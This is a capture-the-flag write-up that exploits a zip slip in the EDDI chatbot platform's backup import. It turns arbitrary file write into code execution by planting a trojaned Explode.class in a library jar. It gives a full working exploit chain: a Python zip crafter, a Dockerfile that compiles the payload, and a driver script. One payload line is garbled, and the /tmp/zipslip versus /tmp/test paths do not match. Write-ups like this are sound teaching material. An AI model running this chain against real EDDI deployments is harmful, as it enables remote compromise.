# Write-up Red wEDDIng
The goal of this challenge is clear. The challenge source is simply https://github.com/labsai/EDDI/blob/main/docker-compose.yml, but a flag and a SUID binary are added to the container. So if you find a way to get arbitrary code execution (`ACE`), then you get the flag.
## Source Code Analysis
In a [previous security advisory](https://github.com/labsai/EDDI/security/advisories/GHSA-49qh-39wc-4p8j), we can read that there was a file inclusion vulnerability in the [RestExportService](https://github.com/labsai/EDDI/blob/release/5.3.3/src/main/java/ai/labs/eddi/backup/impl/RestExportService.java#L95).

Does that also mean there's a `RestImportService`? Yes, [there is](https://docs.labs.ai/import-export-a-chatbot#importing-a-bot). In the [source code](https://github.com/labsai/EDDI/blob/6b91273ff1a9a9e78dedf77383624f83b7ca0a1f/src/main/java/ai/labs/eddi/backup/impl/RestImportService.java#L159), we can see that it calls `this.zipArchive.unzip`:
```java
private void importBotZipFile(InputStream zippedBotConfigFiles, File targetDir, AsyncResponse response) throws
        IOException {
    this.zipArchive.unzip(zippedBotConfigFiles, targetDir);

    String targetDirPath = targetDir.getPath();
    Files.newDirectoryStream(Paths.get(targetDirPath),
                    path -> path.toString().endsWith(BOT_FILE_ENDING))
            .forEach(botFilePath -> {
                try {
                    String botFileString = readFile(botFilePath);
                    BotConfiguration botConfiguration =
                            jsonSerialization.deserialize(botFileString, BotConfiguration.class);
                    botConfiguration.getPackages().forEach(packageUri ->
                            parsePackage(targetDirPath, packageUri, botConfiguration, response));

                    URI newBotUri = createNewBot(botConfiguration);
                    updateDocumentDescriptor(Paths.get(targetDirPath), buildOldBotUri(botFilePath), newBotUri);
                    response.resume(Response.ok().location(newBotUri).build());
                } catch (IOException | RestInterfaceFactory.RestInterfaceFactoryException e) {
                    log.error(e.getLocalizedMessage(), e);
                    response.resume(new InternalServerErrorException());
                }
            });
}
```
The unzip logic is defined in the file [ZipArchive.java](https://github.com/labsai/EDDI/blob/6b91273ff1a9a9e78dedf77383624f83b7ca0a1f/src/main/java/ai/labs/eddi/backup/impl/ZipArchive.java#L75):
```java
@Override
public void unzip(InputStream zipFile, File targetDir) throws IOException {
    if (!targetDir.exists()) {
        targetDir.mkdir();
    }
    ZipInputStream zipIn = new ZipInputStream(zipFile);

    ZipEntry entry = zipIn.getNextEntry();
    // iterates over entries in the zip file
    while (entry != null) {
        String filePath = targetDir.getPath() + File.separator + entry.getName();
        if (!entry.isDirectory()) {
            // if the entry is a file, extracts it
            new File(filePath).getParentFile().mkdirs();
            extractFile(zipIn, filePath);
        } else {
            // if the entry is a directory, make the directory
            File dir = new File(filePath);
            dir.mkdirs();
        }
        zipIn.closeEntry();
        entry = zipIn.getNextEntry();
    }
    zipIn.close();
}
```
But oops, it looks like the zip file entries are not sanitised, so that means we've identified a classical zip slip vulnerability!
## Zip Slip
Let's confirm the zip slip by exporting a bot (saved to `exported.zip`), to which we add an extra file:
```py
import zipfile

with zipfile.ZipFile('exported.zip', "a") as zf:
    zf.writestr('../../../../tmp/zipslip', 'asdf')
```
And then importing it:
```sh
curl "http://localhost:7070/backup/import" --data-binary "@exported.zip" -v -H "Content-Type: application/zip"
```
With a shell in the container, we can see that the `/tmp/test` file has been created, so we have confirmed arbitrary write as the `jboss` user. There's also no restriction on whether files already exist or not, so we can overwrite files - as long as regular linux permissions allow for it.

## Escalating Arbitrary Write to ACE
At this point, we've got ourselves an arbitrary write primitive. This is a very strong primitive and often leads to trivial ways to get `ACE`, but there's no instant win in this case, as we'll soon find out. From a shell in the container we can look for candidates to overwrite:
```sh
find / -user jboss -writable 2>/dev/null | grep -v "^/proc/"
```
The output shows a lot of `.jar` files, but also some other files and directories. A very convenient way of identifying files that have potential, is by using `strace`, to see which files or paths are actually opened when the application is running. Let's make sure we can run `strace`, by making the container privileged:
```yml
services:
  eddi:
    # image: labsai/eddi:latest
    build: .
    privileged: true
```
Now we can add some debugging utilities to the container:
```sh
microdnf install dnf
dnf install -y nano procps strace unzip file net-tools
```
And then:
```sh
strace -p 1 -f -e trace=file,sendto,execve,access,execveat
```
When interacting with the webpage or triggering an import with `curl`, we can see many `openat` calls for `.jar` files. Here's a few:
```c
[pid   501] openat(AT_FDCWD, "/deployments/lib/main/jakarta.ws.rs.jakarta.ws.rs-api-3.1.0.jar", O_RDONLY) = 13
[pid   501] openat(AT_FDCWD, "/deployments/lib/main/org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar", O_RDONLY) = 24
[pid   501] openat(AT_FDCWD, "/deployments/lib/main/io.quarkus.quarkus-rest-client-jaxrs-3.18.2.jar", O_RDONLY) = 33
[pid   501] openat(AT_FDCWD, "/deployments/lib/main/io.quarkus.resteasy.reactive.resteasy-reactive-common-3.18.2.jar", O_RDONLY) = 24
[pid   501] openat(AT_FDCWD, "/deployments/lib/main/io.quarkus.resteasy.reactive.resteasy-reactive-client-3.18.2.jar", O_RDONLY) = 13
[pid   166] openat(AT_FDCWD, "/deployments/lib/main/com.fasterxml.jackson.core.jackson-databind-2.18.2.jar", O_RDONLY) = 33
[pid   504] openat(AT_FDCWD, "/deployments/lib/main/com.fasterxml.jackson.core.jackson-annotations-2.18.2.jar", O_RDONLY) = 24
```
However, when we run the `curl` command again, the same syscalls are not triggered, so what's happening here? Maybe we can overwrite one of these to get `ACE`?
Let's restart the container and overwrite one of the jars before we import our zip, so we trigger an error that gives us more information:
```sh
cp /deployments/lib/main/jakarta.ws.rs.jakarta.ws.rs-api-3.1.0.jar /deployments/lib/main/org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar
```
By going to http://localhost:7070/q/swagger-ui/, we can now find a traceback in the docker logs:
```java
eddi-1     | 2025-03-14 13:20:10 ERROR [io.qua.ver.htt.run.QuarkusErrorHandler]] (vert.x-eventloop-thread-8) HTTP Request to /openapi failed, error id: f3469351-6e05-4fb4-b2aa-3e5f89196b2e-1: java.lang.NoClassDefFoundError: org/eclipse/microprofile/openapi/models/Operation
eddi-1     |    at io.smallrye.openapi.api.OperationHandler.<clinit>(OperationHandler.java:18)
```
So the `java.lang.NoClassDefFoundError` indicates that `java` is trying to load the `org/eclipse/microprofile/openapi/models/Operation` class at runtime from the jar. Does this mean we get `ACE` by overwriting a class that has not been loaded yet and then triggering a load? Since a `.jar` file is just a zip file, which you can confirm by running `unzip -l YOURJAR.jar`, we should be able to compile the target class with a payload added to it. If it compiles, we can just add it to the zip archive.
## Payload Generation
Now we have the idea of overwriting a class in a `.jar` file, but how do we achieve that in practice? Overwriting a class is a process of trial and error and the order in which requests come in and when classes are loaded matters. Here we'll demonstrate how to generate the payload that you can find in `getflag.sh`. After some experimentation, we can find that `org/eclipse/microprofile/openapi/annotations/enums/Explode.class` is loaded after our file write. The source simply looks like this:
```java
package org.eclipse.microprofile.openapi.annotations.enums;

public enum Explode {
    DEFAULT,
    FALSE,
    TRUE;
}
```
In order to make it execute a command when it's loaded, we can change it to:
```java
package org.eclipse.microprofile.openapi.annotations.enums;

public enum Explode {
    DEFAULT,
    FALSE,
    TRUE;

    static {
        try {
            Runtime.getRuntime().exec("/bin/bash /tmp/exploit.sh").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
By compiling it and then overwriting it in `org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar`, we have crafted a malicious `.jar` file! The payload executes `/bin/bash /tmp/exploit.sh`, since we have a file write anyway. This means it's easier to tweak the exact payload we want to execute by updating `exploit.sh`, rather than the java file.

In order to not rely on a request catcher, we can copy the flag to a directory from which html files are served. We can do that by first sending a request to http://localhost:7070/q/swagger-ui/, so the `/tmp/vertx-cache/` directory and subdirectories are created. Now we can put the following in `/tmp/exploit.sh`:
```sh
#!/bin/bash
target=$(ls /tmp/vertx-cache/);
/would you be so kind to provide me with a flag > "/tmp/vertx-cache/$target/META-INF/io.smallrye_smallrye-open-api-ui__jar/META-INF/resources/openapi-ui/flag_exfil";
```
This means the flag will be available at http://localhost:7070/q/swagger-ui/flag_exfil after our exploit chain has been completed.
## Solution Script
The final solution script `getflag.sh` looks like this:
```sh
#!/usr/bin/env sh

set -euo pipefail

# Backup clean exported.zip
cp exported.zip exported.zip.bak

# Let's create the jar-file already, so we don't have to deal with docker permission issues
JAR_NAME="org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar"
touch $JAR_NAME

# Craft jar that includes code execution payload
CONTAINER_NAME="craft_jar_payload"
sudo docker build -t $CONTAINER_NAME .
sudo docker run -it --rm -v ./:/deployments/lib/main/out $CONTAINER_NAME

# Run exploit script that will get the flag
python3 getflag.py

# Cleanup 
rm $JAR_NAME
mv exported.zip.bak exported.zip
```
It first compiles `Explode.java` and creates a malicious `org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar` with the following Dockerfile:
```dockerfile
FROM labsai/eddi:latest

# Switch to root user so we can install packages
USER root 
RUN microdnf install -y zip

# Define some variables we'll use
ENV JAR_NAME="org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar"
ENV JAVA_DIR="org/eclipse/microprofile/openapi/annotations/enums/"
ENV JAVA_NAME="org/eclipse/microprofile/openapi/annotations/enums/Explode.java"
ENV CLASS_NAME="org/eclipse/microprofile/openapi/annotations/enums/Explode.class"
ENV OUT_DIR="/deployments/lib/main/out/"

# Prepare
WORKDIR /deployments/lib/main
RUN mkdir $OUT_DIR
    
# Compile `Explode.class`
RUN mkdir -p $JAVA_DIR
COPY ./Explode.java $JAVA_NAME
RUN javac $JAVA_NAME

# Overwrite `Explode.class` in jarfile
RUN zip $JAR_NAME $CLASS_NAME

# Overwrite ENTRYPOINT so the jar is copied to our mounted working directory on the host
ENTRYPOINT cp $JAR_NAME "$OUT_DIR$JAR_NAME"
```
And then runs this python script to automate the rest:
```py
import zipfile
import requests

sess = requests.Session()
HOST = "http://localhost:7070"
# HOST = 'https://e11f64c73f782e0fc98eb08dd2cd6009-31189.inst1.chal-kalmarc.tf'

# Add jar with payload and `exploit.sh` to `exported.zip`
filename_jar = 'org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar'
target_filename_jar = '/deployments/lib/main/' + filename_jar

filename_exploit = 'exploit.sh'
target_filename_exploit = '/tmp/exploit.sh'

exported_zip = 'exported.zip'
with zipfile.ZipFile(exported_zip, "a") as zf:
    zf.writestr('../../../..' + target_filename_exploit, open(filename_exploit, 'rb').read())
    zf.writestr('../../../..' + target_filename_jar, open(filename_jar, 'rb').read())

# First request - Ensure the subdirectories in /tmp/vertx-cache/ are created, so we can exfil the flag there
r = sess.get(f"{HOST}/q/swagger-ui/")
print("First:", r.status_code)

# Second request - file upload. Trigger zip slip and code execution in same request
r = sess.post(f"{HOST}/backup/import", data=open(exported_zip, "rb"), headers={"Content-Type": "application/zip"})
print("Second:", r.status_code)

# Third request - retrieve the flag
r = sess.get(f"{HOST}/q/swagger-ui/flag_exfil")
print("Third:", r.status_code, end='\n\n')
flag = r.text
print(flag)
```
And that's how to get the flag for this challenge!